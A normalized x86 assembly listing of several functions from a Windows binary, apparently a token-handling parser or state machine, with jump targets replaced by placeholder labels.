push edi
call sub_10059bc0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_1006d5e0
mov ebx eax
mov eax edi
call sub_1006dd70
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
cmp eax 0x71
sete cl
test ecx ecx
je r-xdata
xor ecx ecx
cmp eax 0x72
sete cl
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1006fe10
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
push 0x96
push 0x73
push 0x74
push 0x6d
push 0x1
mov eax esi
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x6f
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x72
sete cl
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ebx [ edi + 0xc ]
push 0x72
mov eax edi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
xor edx edx
cmp eax 0x71
sete dl
mov eax edx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push 0x72
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
push edi
mov eax 0x6f
call sub_1006e980
add esp 0x8
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_10059bc0
add esp 0xc
mov esi edi
call sub_1006ebc0
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
xor ecx ecx
cmp eax 0x6f
sete cl
mov eax ecx
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push 0x72
mov eax edi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
push 0x71
mov eax edi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
mov ecx [ ebx + 0x8 ]
mov eax [ ecx + eax * 4 - 0x8 ]
push 0x71
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push 0x72
mov eax ebx
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
mov eax ebx
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
cmp edi 0x7
mov edi [ ebp + 0x8 ]
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x7
sete al
test eax eax
je r-xdata
mov esi edi
call sub_1006ebc0
mov edx [ edi + 0xc ]
pop ebx
pop edi
mov [ edx + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10059bc0
add esp 0x8
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax 0x6f
call sub_1006e980
add esp 0x4
test eax eax
je r-xdata
mov eax edi
call sub_1006dc90
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_1006d7e0
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_10059bc0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_1006d7e0
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10059bc0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax edi
call sub_1006dc90
push 0x71
mov eax ebx
call sub_1006dc90
mov edi esi
call sub_1006e0a0
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax ebx
call sub_1006dc90
mov eax edi
call sub_1006d5e0
mov ecx [ edi + 0x4 ]
cmp eax [ ecx + 0x4 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1006fae0
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
mov esi edi
call sub_1006ebc0
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_1006d7e0
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10072410
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x96
push 0x68
push 0x67
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x60
mov ebx 0x1
push ebx
mov eax esi
call sub_1006d8a0
add esp 0x28
test eax eax
mov eax esi
je r-xdata
push 0x96
push 0x68
push 0x67
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x60
push 0x0
call sub_1006d8a0
add esp 0x28
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push edi
call sub_1006d7e0
add esp 0x4
mov eax edi
call sub_1006dc90
lea esi [ ebx + 0x6e ]
lea ecx [ ecx ]
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_100720d0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov ecx [ esi + 0x18 ]
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x4 ]
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_1006e640
add esp 0x1c
test eax eax
je r-xdata
mov eax edi
call sub_1006dc90
jmp r-xdata
cmp [ eax + 0x1c ] esi
je r-xdata
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10059bc0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006dc90
mov esi 0x6f
cmp [ eax ] ebx
jne r-xdata
mov eax edi
call sub_1006d670
mov eax [ edi + 0xc ]
pop edi
mov [ eax + 0x34 ] ebx
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006dc90
jmp r-xdata
cmp [ eax + 0x1c ] esi
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax edi
call sub_1006d670
mov eax edi
call sub_1006d670
mov ecx [ edi + 0xc ]
pop edi
pop esi
mov [ ecx + 0x34 ] ebx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10072560
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006fe10
add esp 0x8
pop ebp
retn
cmp ecx 0x1
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
jne r-xdata
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
push ebx
mov ebx [ edx + 0x4 ]
mov esi eax
mov eax ecx
call sub_1006dd70
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
cmp ecx 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
xor eax eax
pop esi
pop ebp
retn
cmp ecx 0x7
je r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov [ edx ] 0x6
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov [ edx ] 0x15
mov eax [ eax + 0xc ]
mov ecx [ eax + 0x8 ]
mov ecx [ ecx ]
mov eax [ eax + 0x68 ]
add ecx 0x10
call sub_1006dc50
sub_10072640
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
cmp edx 0x4
jne r-xdata
push ebx
push esi
cmp edx 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_1006e240
mov eax 0x1
pop edi
pop ebp
retn
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_1006dd70
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_1006dd70
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
pop edi
pop ebp
retn
cmp edx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
cmp edx 0x1
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x81
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x81
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_1006fe10
add esp 0x8
pop esi
pop ebx
pop edi
pop ebp
retn
mov esi [ ebp + 0x8 ]
cmp edx 0x7
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x80
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006e0a0
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
push esi
mov eax edi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
push 0x0
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x82
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006e0a0
mov eax ebx
call sub_1006dc90
mov edx [ ebx + 0xc ]
mov [ edx + 0x38 ] 0x1
push esi
mov eax edi
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0xc
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
mov eax esi
call sub_1006dc90
push 0x81
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
push esi
mov eax edi
call sub_1006d7e0
add esp 0x4
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_1006fae0
add esp 0x8
pop esi
pop ebx
pop edi
pop ebp
retn
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ esi + 0xc ]
mov [ ecx ] 0x14
sub_10072820
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push edi
cmp ecx 0x4
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_1006e240
mov eax 0x1
pop edi
pop ebp
retn
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0xc
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp ecx 0x1
jne r-xdata
push ebx
mov esi eax
mov ebx edx
mov eax edi
call sub_1006dd70
pop ebx
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
cmp ecx 0x2
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
cmp ecx 0x1
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006fe10
add esp 0x8
pop esi
pop edi
pop ebp
retn
cmp ecx 0x7
je r-xdata
xor edx edx
cmp [ eax + 0x18 ] 0x82
sete dl
test edx edx
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov eax [ eax + 0x68 ]
add ecx 0x10
call sub_1006dc50
mov eax [ esi + 0xc ]
mov [ eax ] 0x16
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006fae0
add esp 0x8
pop esi
pop edi
pop ebp
retn
sub_10072920
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
cmp ecx 0x3
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ ecx ]
call sub_1006dd70
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1006fe10
add esp 0x8
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
cmp ecx 0x1
jne r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx ] 0x6
mov eax [ edi + 0xc ]
pop edi
mov [ eax + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
lea eax [ ecx - 0x6 ]
pop esi
pop ebp
retn
sub_100729b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
cmp ecx 0x3
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ ecx ]
call sub_1006dd70
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_1006fe10
add esp 0x8
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
cmp ecx 0x1
jne r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
lea eax [ ecx - 0x6 ]
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10059bc0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
xor eax eax
cmp [ esi + 0x18 ] 0x82
sete al
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_1006fae0
add esp 0x8
pop esi
pop ebp
retn
sub_10072a60
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov ebx eax
mov esi [ ebx ]
push edi
cmp esi 0x6
ja r-xdata
push 0x96
push 0x33
push 0x1e
push 0x3a
push 0x94
push 0x5f
push 0x37
push 0x36
push 0x8a
push 0x29
push 0x41
push 0x2a
push 0x2b
push 0x3c
push 0x1b
push 0x19
push 0x1d
push 0x92
push 0x5
push 0x7a
push 0x84
push 0x1f
push 0x47
push 0x38
push 0x1a
push 0x1
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x49
push 0x28
push 0x21
push 0x20
push 0x26
push 0x22
push 0x32
push 0x8e
push 0x42
push 0xa
push 0x1c
push 0x8c
push 0x39
push 0x1
call sub_1006d8a0
add esp 0xb8
test eax eax
jne r-xdata
jmp [ esi * 4 + jump_table_10072e20 ]
mov edi [ ebp + 0x8 ]
push edi
mov eax ebx
call sub_1006d7e0
add esp 0x4
cmp esi 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006d7e0
mov [ ebx ] 0x5
mov eax [ r--data ]
mov [ ebx + 0x18 ] eax
add esp 0x4
mov edi ebx
mov eax esi
call sub_1006e240
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edi ebx
call sub_1006e240
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edi ebx
mov eax esi
call sub_1006e240
push r--data
call sub_1003bee0
mov ecx [ esi + 0xc ]
add esp 0x4
pop edi
pop esi
mov [ ecx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0xc ]
mov [ ecx + 0x34 ] 0x1
mov eax edi
call sub_1006d5e0
call sub_1006d990
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
cmp [ ebx + 0x18 ] 0x8f
sete al
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi ebx
mov ebx edx
call sub_1006dd70
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
mov ebx edx
call sub_1006dd70
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006d5e0
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + ecx * 4 - 0x4 ]
xor esi esi
jmp r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea esi [ ebx + 0x1c ]
push r--data
push esi
call sub_1005a810
add esp 0x8
test eax eax
jne r-xdata
mov eax edi
call sub_1006dc90
mov eax edi
call sub_1006d5e0
mov esi eax
call sub_1006d960
test eax eax
jne r-xdata
mov edx [ edi + 0xc ]
mov edi [ edx + 0xc ]
dec edi
test edi edi
jle r-xdata
push edi
mov eax ebx
call sub_1006d7e0
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
mov edx [ esi + 0x24 ]
mov [ ebp - 0xc ] edx
mov eax [ esi + 0x28 ]
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] eax
call sub_1003b770
lea edx [ ebp - 0xc ]
push edx
call sub_1003b770
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_1004d430
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
push r--data
push esi
call sub_1005a810
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
push ebx
push eax
mov eax [ edx * 4 + r--data ]
call eax
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
push edi
push eax
push ecx
push r--data
call sub_1003bee0
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0xc ]
push eax
call sub_1004d430
add esp 0x18
test eax eax
jne r-xdata
mov esi [ ecx + 0x20 ]
cmp esi 0x2
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
push r--data
push esi
call sub_1005a810
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push r--data
call sub_1003bee0
add esp 0x4
mov edi edi
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov eax [ edx + 0x8 ]
mov esi [ eax + edi * 4 - 0x4 ]
dec edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
cmp esi 0x1
jne r-xdata
mov eax ebx
call sub_1006efc0
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
call sub_1006dc90
cmp eax esi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x24 ]
mov [ ebp - 0xc ] ecx
mov edx [ esi + 0x28 ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edx
call sub_1003b770
add esp 0x4
test edi edi
jg r-xdata
push edi
mov eax ebx
call sub_1006ef00
push edi
mov eax esi
call sub_1006e130
add esp 0x8
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push edi
mov eax ebx
call sub_1006ef60
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006dc90
mov eax [ edi + 0xc ]
mov [ eax + 0x38 ] 0x1
sub_10072e40
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push ebx
xor ebx ebx
mov ecx 0xa
cmp [ eax + 0x40 ] ebx
je r-xdata
mov [ eax + 0x40 ] ebx
cmp [ esi ] 0x2
jne r-xdata
cmp [ esi ] 0x4
jne r-xdata
mov eax [ edx + 0xc ]
mov ecx [ eax + 0xc ]
push edi
cmp ecx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] ecx
sete al
cmp eax ebx
je r-xdata
cmp [ esi + 0x18 ] ecx
jne r-xdata
mov eax [ edx + 0xc ]
mov ecx [ eax ]
push esi
push edx
mov edx [ ecx * 4 + r--data ]
call edx
add esp 0x8
pop edi
pop ebx
pop ebp
retn
mov eax [ eax + 0x8 ]
mov edi [ eax + ecx * 4 - 0x4 ]
cmp edi ebx
je r-xdata
cmp [ esi ] 0x2
jne r-xdata
mov ecx [ edx + 0xc ]
mov [ ecx + 0x6c ] 0x1
mov [ eax + 0x40 ] ebx
mov ecx [ edx + 0xc ]
mov eax [ ecx + 0x68 ]
push eax
push edx
call sub_10059bc0
add esp 0x8
mov eax 0x1
pop ebx
pop ebp
retn
mov ecx [ edi + 0x1c ]
push ecx
call sub_10045960
push eax
push r--data
call sub_1003bee0
mov ebx [ edi + 0x20 ]
add esp 0xc
test ebx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] ebx
sete al
cmp eax ebx
je r-xdata
mov edx [ ebp + 0x8 ]
push 0x96
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push edi
call sub_1006d8f0
add esp 0x1c
test eax eax
je r-xdata
mov eax [ edx + 0xc ]
mov [ eax + 0x70 ] 0x1
cmp ebx 0x2
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov eax edi
call sub_1006d990
test eax eax
je r-xdata
cmp [ edi ] 0x1
jne r-xdata
mov eax [ esi ]
cmp eax 0x5
je r-xdata
cmp [ esi ] 0x7
je r-xdata
mov eax [ esi ]
cmp eax 0x1
je r-xdata
cmp [ edi + 0x1c ] 0x5b
jne r-xdata
cmp eax 0x4
je r-xdata
pop edi
pop ebx
mov eax esi
pop ebp
jmp sub_10072a60
cmp eax 0x5
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
cmp eax 0x6
je r-xdata
cmp eax 0x6
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x5c
sete al
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp eax 0x4
je r-xdata
push 0x96
push 0x5a
push 0x59
push eax
mov eax esi
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
sub_10072fb0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
test edi edi
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_1006d7e0
add esp 0x4
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
je r-xdata
cmp edi 0x4
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x8
sete al
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1006fe10
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1006fae0
add esp 0x8
pop edi
pop esi
pop ebp
retn
cmp edi 0x3
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_1006dc90
mov edx [ esi + 0xc ]
lea eax [ edi - 0x1 ]
pop edi
mov [ edx ] 0x3
pop esi
pop ebp
retn
push 0x96
push 0x6
push 0x82
push 0x5
push 0x4
push 0x7e
push 0x8b
push 0x1
mov eax esi
call sub_1006d8a0
add esp 0x20
test eax eax
jne r-xdata
push 0x96
push 0x8
push 0x1
push 0x1
mov eax esi
call sub_1006d8a0
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10059bc0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
add esp 0x4
mov eax edi
call sub_1006dc90
mov eax [ edi + 0xc ]
mov [ eax ] 0x3
mov ecx [ edi + 0xc ]
pop edi
mov [ ecx + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
cmp [ esi + 0x18 ] 0x42
sete al
test eax eax
je r-xdata
sub_100730f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0xc ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov [ ebp - 0x4 ] ecx
cmp edi 0x4
jne r-xdata
test edi edi
je r-xdata
mov edi esi
mov eax ebx
call sub_1006e240
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov eax esi
call sub_1006d7e0
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push ebx
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x3
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
push 0x96
push 0x2
push 0x6
push 0x7
push 0x82
push 0x5
push 0x4
push 0x7e
push 0x8b
push 0x3
push 0x1
mov eax esi
call sub_1006d8a0
add esp 0x2c
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
mov edx [ ecx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_1006dd70
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_1006dd70
lea eax [ edi - 0x2 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1
jne r-xdata
push ebx
mov eax esi
call sub_1006d7e0
mov edi ebx
call sub_1006db30
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
lea edi [ eax + 0x8 ]
push edi
push ecx
push ebx
call sub_100049a0
push esi
push ebx
call sub_1006fae0
mov edx [ ebp - 0x4 ]
mov esi eax
mov eax [ edx + 0x2c ]
push edi
push eax
push ebx
call sub_1001b720
add esp 0x24
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax 0xa
sete cl
test ecx ecx
je r-xdata
push esi
push ebx
call sub_1006fe10
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x2
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] edi
sete al
test eax eax
jne r-xdata
xor edx edx
cmp eax 0x81
sete dl
mov eax edx
test eax eax
je r-xdata
mov edi esi
call sub_1006e0a0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] 0x0
mov ecx [ ebx + 0xc ]
pop edi
pop esi
mov [ ecx ] 0x6
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
